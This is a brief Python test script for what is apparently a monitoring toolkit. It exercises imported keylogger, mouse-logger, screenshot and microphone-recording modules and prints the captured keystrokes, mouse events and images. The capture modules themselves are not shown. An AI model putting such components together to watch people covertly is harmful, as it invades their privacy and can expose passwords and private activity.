import keylog
import time
import getImage
import getSound
import Mouselogger

def main():

    #test_keylog(1)
    #test_mouselog(1)
    #test_getImage()
    test_getSound()


def test_keylog(waittime):
    klog = keylog.KeyLogger()
    klog.start()
    time.sleep(waittime)
    klog.stop()
    print(klog.keys)

def test_mouselog(waittime):
    mlog = Mouselogger.Mouselog()
    mlog.start()
    time.sleep(waittime)
    mlog.stop()
    print(mlog.move)
    print(mlog.clic)
    print(mlog.scroll)

def test_getImage():
    screen = getImage.GetImage()
    screen.takeScreen()
    print(screen.image)

def test_getSound():
    sound = getSound.getSound()
    sound.record(2)

if __name__ == "__main__":
    main()